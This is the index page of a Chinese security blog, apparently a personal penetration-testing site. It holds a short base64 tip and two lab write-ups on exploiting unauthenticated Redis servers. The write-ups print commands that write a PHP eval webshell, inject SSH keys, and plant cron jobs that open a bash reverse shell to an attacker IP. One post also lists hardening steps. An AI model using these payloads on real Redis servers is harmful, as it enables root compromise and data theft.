<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"swanq.top","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="Try &amp; Enjoy">
<meta property="og:type" content="website">
<meta property="og:title" content="SwanQ&#39;s Blue SKY">
<meta property="og:url" content="http://swanq.top/index.html">
<meta property="og:site_name" content="SwanQ&#39;s Blue SKY">
<meta property="og:description" content="Try &amp; Enjoy">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="swanQ">
<meta property="article:tag" content="penetration, forensics, web, cyber security">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://swanq.top/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>SwanQ's Blue SKY</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">SwanQ's Blue SKY</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">TO LIVE IS TO RISK IT ALL</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/07/01/base-64/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/07/01/base-64/" class="post-title-link" itemprop="url">base64解决terminal之间编码不同的问题</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-07-01 18:03:11 / 修改时间：22:32:47" itemprop="dateCreated datePublished" datetime="2021-07-01T18:03:11+08:00">2021-07-01</time>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>455</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有些特殊字符没法以可打印字符的形式打印出来复制时，先编码一下，与url编码的原理相同</p>
<p>简单使用：</p>
<p><img src="/2021/07/01/base-64/1.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@192: echo swanq &gt; 1</span><br><span class="line">root@192: echo circle &gt; 2</span><br><span class="line"></span><br><span class="line">root@192: diff -u 1 2 | base64 &gt; patch</span><br><span class="line"></span><br><span class="line">root@192: cat patch</span><br><span class="line">LS0tIDEJMjAyMS0wNy0wMSAyMjoyNDoxNy4wNzc3Mjc0MTAgKzA4MDAKKysrIDIJMjAyMS0wNy0wMSAyMjoyNDoyMy43OTc3Mjc2NzQgKzA4MDAKQEAgLTEgKzEgQEAKLXN3YW5xCitjaXJjbGUK</span><br><span class="line"></span><br><span class="line">root@192:&#x2F;home&#x2F;file# cat patch| base64 -d</span><br><span class="line">--- 1   2021-07-01 22:24:17.077727410 +0800</span><br><span class="line">+++ 2   2021-07-01 22:24:23.797727674 +0800</span><br><span class="line">@@ -1 +1 @@</span><br><span class="line">-swanq</span><br><span class="line">+circle</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/01/base-64/2.png"></p>
<h1 id><a href="#" class="headerlink" title></a></h1>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/06/17/redis%E5%86%99%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%87%BA%E9%94%99/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/06/17/redis%E5%86%99%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%87%BA%E9%94%99/" class="post-title-link" itemprop="url">redis未授权写定时任务反弹shell出错解析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-06-17 19:49:00" itemprop="dateCreated datePublished" datetime="2021-06-17T19:49:00+08:00">2021-06-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-06-18 21:46:52" itemprop="dateModified" datetime="2021-06-18T21:46:52+08:00">2021-06-18</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>2k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第二次在总结redis未授权利用方式写crontab时，使用的是Ubuntu，发现反弹shell失败。然而第一次用CentOs时却没有此问题出现。特此刨根问底总结一下原因。</p>
<h1 id="0x01-cron服务和crontab命令"><a href="#0x01-cron服务和crontab命令" class="headerlink" title="0x01 cron服务和crontab命令"></a>0x01 cron服务和crontab命令</h1><h2 id="1-cron和crontab"><a href="#1-cron和crontab" class="headerlink" title="1.cron和crontab"></a>1.cron和crontab</h2><p>Linux存在需要定期执行的任务-例行性工作，分为用户设置的例行性任务和系统层面的例行性任务，其中：</p>
<ul>
<li>cron：执行计划命令的守护程序，会每分钟检查是否有任务需要执行</li>
<li>crontab：维护某用户crontab 文件的命令</li>
<li>cron 会查找/var/spool/cron/crontabs/ 目录下的文件及 /etc/crontab 文件中所有 crontab 命令，并读入内存中。</li>
</ul>
<p>具体crontab和cron用man自行查看</p>
<h2 id="2-ubuntu的cron程序位置"><a href="#2-ubuntu的cron程序位置" class="headerlink" title="2.ubuntu的cron程序位置"></a>2.ubuntu的cron程序位置</h2><p>ubuntu下可利用的cron包括：</p>
<ul>
<li><p>/var/spool/cron/crontabs/：该目录下定义的任务计划文件会被执行，前提是该任务计划文件的<strong>权限必须为600</strong></p>
</li>
<li><p>/etc/crontab：该文件里面的任务计划可直接执行，负责调度各种管理和维护任务</p>
</li>
<li><p>/etc/cron.d/*：存放任何要执行的crontab文件或脚本。该目录下任意文件都可被当作任务计划执行，且避免原先任务计划文件被覆盖</p>
</li>
<li><p>还可以把脚本放在其他目录，包括</p>
<p>/etc/cron.hourly、/etc/cron.daily、/etc/cron.weekly、/etc/cron.monthly目录中，让它每小时/天/星期、月执行一次。</p>
</li>
</ul>
<blockquote>
<p>/etc/crontab参数含义：</p>
<p>m:分钟 - 从0到59的整数 </p>
<p>h:小时 - 从0到23的整数 </p>
<p>dom:天 - 从1到31的整数 (必须是指定月份的有效日期) </p>
<p>mon:月 - 从1到12的整数 (或如Jan或Feb简写的月份) </p>
<p>dow:周一到周日 - 从0到7的整数，0或7用来描述周日 (或用Sun或Mon简写来表示)</p>
<p>user:指的是执行命令的用户 </p>
<p>command: 需要执行的命令 </p>
<p><em>表示参数所有可用的值，如果为5个</em>，就代表每分钟执行一次 </p>
<p>/：指定步进设置。“/<interger>”表示步进值,比如*/2 * * * *代表每两分钟执行一次任务</interger></p>
</blockquote>
<h1 id="0x02-查找原因"><a href="#0x02-查找原因" class="headerlink" title="0x02 查找原因"></a>0x02 查找原因</h1><p>查看/var/log/syslog可找到相关日志。因syslog记录系统所有日志信息。</p>
<p>1.写/var/spool/cron目录时</p>
<p>提示命令执行出现错误，ubuntu会将这些错误信息输出到ubuntu系统的邮件服务器，但是ubuntu系统默认没有安装邮件服务器，所以导致了错误</p>
<p>错误原因包括：</p>
<ol>
<li>/var/spool/cron/crontabs/权限不对劲，并非600</li>
<li>ubuntu的cron的shell环境为/bin/sh</li>
</ol>
<p>针对原因2可采用第二种方式：</p>
<p>2.写/etc/cron.d目录时</p>
<p>此时step1先更改/bin/sh为/bash,step2使用bash反弹shell。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> aaa <span class="string">&quot;nnnn* * * * * root ln -s -f bash /bin/shnnnn&quot;</span></span><br><span class="line">config <span class="built_in">set</span> dir /etc/cron.d</span><br><span class="line">config <span class="built_in">set</span> dbfilename step1</span><br><span class="line">save</span><br><span class="line"><span class="built_in">set</span> bbb <span class="string">&quot;nnnn* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.101/7777 0&gt;&amp;1nnnn&quot;</span></span><br><span class="line">config <span class="built_in">set</span> dir /etc/cron.d</span><br><span class="line">config <span class="built_in">set</span> dbfilename step2</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>成功创建任务计划step1和step2，但是还是无法反弹shell。错误日志显示语法错误</p>
<p><img src="/2021/06/17/redis%E5%86%99%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%87%BA%E9%94%99/14.png"></p>
<p>原因：redis向任务计划文件里写内容出现乱码而导致的语法错误。</p>
<ul>
<li>centos会忽略乱码去执行格式正确的任务计划</li>
<li>ubuntu并不会忽略这些乱码，所以导致命令执行失败，作为正常用户向/etc/cron.d目录下写任务计划文件时，命令可以正常执行。利用redis未授权访问写的任务计划文件里都有乱码，这些代码来自redis的缓存数据</li>
</ul>
<h1 id="0x03-复现"><a href="#0x03-复现" class="headerlink" title="0x03 复现"></a>0x03 复现</h1><p>具体环境搭建不再赘述</p>
<p>靶机：CentOS 192.168.140.132</p>
<p>攻击机：Kali  192.168.140.130</p>
<p>CentOS启动redis服务：</p>
<p><img src="/2021/06/17/redis%E5%86%99%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%87%BA%E9%94%99/15.png"></p>
<p>kali监听本机9999端口的返回任务</p>
<p><img src="/2021/06/17/redis%E5%86%99%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%87%BA%E9%94%99/17.png"></p>
<p>kali写入定时任务</p>
<p><img src="/2021/06/17/redis%E5%86%99%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%87%BA%E9%94%99/16.png"></p>
<p>写入成功，直接拿到root下的bash</p>
<p><img src="/2021/06/17/redis%E5%86%99%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%87%BA%E9%94%99/18.png"></p>
<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>ubuntu确实设计比centos安全，建议遇到ubuntu还是用其他两种方式。具体利用方式参考上一篇文章。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/news/301606">https://cloud.tencent.com/developer/news/301606</a></li>
<li><a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/2019/11/18/5dd20bda178db/">https://www.dazhuanlan.com/2019/11/18/5dd20bda178db/</a></li>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241146">https://www.anquanke.com/post/id/241146</a></li>
<li>Linux日志排查：<a target="_blank" rel="noopener" href="https://baijiahao.baidu.com/s?id=1613381635234443098&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1613381635234443098&amp;wfr=spider&amp;for=pc</a></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">redis未授权总结</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-06-04 22:32:04" itemprop="dateCreated datePublished" datetime="2021-06-04T22:32:04+08:00">2021-06-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-06-17 22:03:16" itemprop="dateModified" datetime="2021-06-17T22:03:16+08:00">2021-06-17</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>2.6k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前总结过的内容被自己的windows defender杀掉了，现哭着再总结一次。起因源于之前参加hvv遇到此洞，故而作此总结。</p>
<h1 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h1><p>用ANSI  C写的redis作为非关系型内存数据库，是key-value存储系统，且支持主从服务器同步。redis漏洞产生的原因一般是：</p>
<ul>
<li><strong>直接暴露在公网</strong>：绑定在 <code>0.0.0.0:6379</code>，且没有进行添加防火墙规则、避免其他非信任来源IP访问等相关安全策略</li>
<li><strong>没有设置密码认证</strong>(一般为空)：可以免密远程登录redis服务</li>
</ul>
<p>漏洞可能产生的危害:</p>
<p>攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以通过恶意执行flushall来清空所有数据<br>攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件<br>如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害者服务器</p>
<p>下图为redis拿shell的三种方式及其条件：</p>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/2.jpg"></p>
<h1 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h1><p>靶机：Ubuntu 192.168.140.129</p>
<p>攻击机：kali 192.168.140.130</p>
<p>kali一键安装redis，sudo apt install redis</p>
<p>Ubuntu debian或其他环境安装指南：</p>
<p>安装：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf redis-6.0.1.tar.gz</span><br><span class="line">mv redis-6.0.1 /usr/local/redis</span><br><span class="line">cd /usr/local/redis</span><br><span class="line">make &amp; make install</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 任意目录启动</span></span><br><span class="line">cp redis-server /usr/bin</span><br><span class="line">cp redis-cli /usr/bin</span><br><span class="line">cp redis.conf /etc</span><br></pre></td></tr></table></figure>

<p>配置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 去掉仅对内网开放，加#</span><br><span class="line"># bind 127.0.0.1</span><br><span class="line"># redis关闭守护进程</span><br><span class="line">daemonize no</span><br><span class="line"># 关闭保护模式</span><br><span class="line">protected-mode no</span><br><span class="line"></span><br><span class="line"># 重启配置文件</span><br><span class="line">redis-server redis.conf</span><br><span class="line"># 关闭防火墙</span><br><span class="line">ufw disable</span><br></pre></td></tr></table></figure>

<p>当然，别忘了，ubuntu要启动redis-server服务。</p>
<p>为保证后面写入计划任务，此处以root权限启动redis</p>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/10.png"></p>
<h1 id="0x03-利用方式"><a href="#0x03-利用方式" class="headerlink" title="0x03 利用方式"></a>0x03 利用方式</h1><h2 id="1-写webshell"><a href="#1-写webshell" class="headerlink" title="1. 写webshell"></a>1. 写webshell</h2><h3 id="条件："><a href="#条件：" class="headerlink" title="条件："></a><strong>条件：</strong></h3><p>存在web目录</p>
<p>晓得绝对路径</p>
<p>当然还要有写入权限</p>
<h3 id="流程："><a href="#流程：" class="headerlink" title="流程："></a><strong>流程：</strong></h3><p>实际渗透过程中，这个方法通常需要搭配 phpinfo 等信息使用</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h  192.168.140.129 or 域名</span><br><span class="line">config set dir /var/www/html/</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置写入文件</span></span><br><span class="line">config set dbfilename 1.php</span><br><span class="line"><span class="meta">#</span><span class="bash"> 以键值对的形式写入一句话木马</span></span><br><span class="line">set webshell &quot;&lt;?php @eval($_POST[&#x27;swanq&#x27;]);?&gt;&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 保存写入硬盘</span></span><br><span class="line">save </span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/1.png"></p>
<p>最后用蚁剑连接即可：<code>http://192.168.127.139/1.php</code></p>
<h2 id="2-写ssh公钥"><a href="#2-写ssh公钥" class="headerlink" title="2. 写ssh公钥"></a>2. 写ssh公钥</h2><p>原理：Redis 未授权访问通过写 <code>/root/.ssh</code>下的authorized_keys 来拿权限</p>
<h3 id="条件：-1"><a href="#条件：-1" class="headerlink" title="条件："></a><strong>条件：</strong></h3><p>对外开启ssh服务</p>
<p>Redis 服务运行在 root 用户下（否则还要猜测用户）</p>
<h3 id="流程：-1"><a href="#流程：-1" class="headerlink" title="流程："></a><strong>流程：</strong></h3><p>生成本机ssh公私钥</p>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/2.png"></p>
<p>为防止脏数据污染公钥，在公钥内容上下加空行。之后将公钥写入key.txt</p>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/3.png"></p>
<blockquote>
<p>shell的echo :</p>
<p>用于字符串输出，其注意事项如下图所示：</p>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/7.png"></p>
</blockquote>
<p>redis远程连接靶机，将公钥文件key.txt写入靶机</p>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/4.png"></p>
<blockquote>
<p>-x：read last argument from STDIN</p>
<p>cat key.txt | redis -h 192.168.140.129 -x set crack：</p>
<ul>
<li><p>cat key.txt 输出 作为后面的输入</p>
</li>
<li><p>-x 读取标准输入</p>
</li>
<li><p>set crack 是将读取的输入作为crack此参数内容</p>
<p>相当于把参数crack参数和-x读的数据组了个命令执行</p>
</li>
</ul>
</blockquote>
<p>找到靶机redis备份路径：</p>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/8.png"></p>
<p>更改redis备份路径为ssh公钥存放目录/home/glory/.ssh,默认情况为/root/.ssh。并设置上传公钥文件名为authorized_keys</p>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/5.png"></p>
<blockquote>
<p>config:可查看或设置配置项</p>
<p>dbfilename:备份文件</p>
</blockquote>
<p>SSH远程登陆成功</p>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/6.png"></p>
<h2 id="3-在crontab中写定时任务"><a href="#3-在crontab中写定时任务" class="headerlink" title="3. 在crontab中写定时任务"></a>3. 在crontab中写定时任务</h2><h3 id="条件：-2"><a href="#条件：-2" class="headerlink" title="条件："></a>条件：</h3><p>有可写计划任务的权限,将文件写入到计划目录下执行</p>
<p>多见于CentOs使用</p>
<h3 id="流程：-2"><a href="#流程：-2" class="headerlink" title="流程："></a>流程：</h3><p>攻击机监听本机9999端口，接收之后的反弹shell</p>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/9.png"></p>
<p>利用redis以root权限运行有可写计划任务的权限，写crontab</p>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/11.png"></p>
<blockquote>
<p>1./var/spool/cron目录存储每个用户生成的crontab文件</p>
<p>2.直接往当前用户的crontab中写反弹shell，必须要换行</p>
<p>3.* * * * * myCommand：1分钟执行一次myCommand</p>
<p>4.n个数大于2，否则文件内容里面的任务计划会出现乱码导致命令执行失败</p>
</blockquote>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/12.png"></p>
<p>观察到此时并无反弹shell。但是确实写入成功。</p>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/13.png"></p>
<p>具体排查问题另起一篇博客说明。</p>
<h1 id="0x02-如何防护"><a href="#0x02-如何防护" class="headerlink" title="0x02 如何防护"></a>0x02 如何防护</h1><h4 id="1-禁止远程使用一些高危命令"><a href="#1-禁止远程使用一些高危命令" class="headerlink" title="1.禁止远程使用一些高危命令"></a>1.禁止远程使用一些高危命令</h4><p>我们可以通过修改redis.conf文件来禁用远程修改DB文件地址</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename-command FLUSHALL &quot;&quot;</span><br><span class="line">rename-command CONFIG   &quot;&quot;</span><br><span class="line">rename-command EVAL     &quot;&quot;</span><br></pre></td></tr></table></figure>

<h4 id="2-低权限运行Redis服务"><a href="#2-低权限运行Redis服务" class="headerlink" title="2.低权限运行Redis服务"></a>2.低权限运行Redis服务</h4><p>为Redis服务创建单独的<code>user</code>和<code>home</code>目录，并且配置禁止登陆</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupadd -r redis &amp;&amp; useradd -r -g redis redis</span><br></pre></td></tr></table></figure>

<h4 id="3-为Redis添加密码验证"><a href="#3-为Redis添加密码验证" class="headerlink" title="3.为Redis添加密码验证"></a>3.为Redis添加密码验证</h4><p>我们可以通过修改redis.conf文件来为Redis添加密码验证</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requirepass mypassword</span><br></pre></td></tr></table></figure>

<h4 id="4-禁止外网访问-Redis"><a href="#4-禁止外网访问-Redis" class="headerlink" title="4.禁止外网访问 Redis"></a>4.禁止外网访问 Redis</h4><p>我们可以通过修改redis.conf文件来使得Redis服务只在当前主机可用</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bind 127.0.0.1</span><br></pre></td></tr></table></figure>

<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
<li>下载链接：<a target="_blank" rel="noopener" href="http://download.redis.io/releases/redis-6.0.1.tar.gz">http://download.redis.io/releases/redis-6.0.1.tar.gz</a></li>
<li><a target="_blank" rel="noopener" href="https://hejueyun.github.io/posts/2218125b/">https://hejueyun.github.io/posts/2218125b/</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/223432.html">https://www.freebuf.com/vuls/223432.html</a></li>
<li>redis相关：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241146">https://www.anquanke.com/post/id/241146</a></li>
<li>corntab命令参考：<a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/linux-crontab-tasks.html">https://www.runoob.com/w3cnote/linux-crontab-tasks.html</a></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
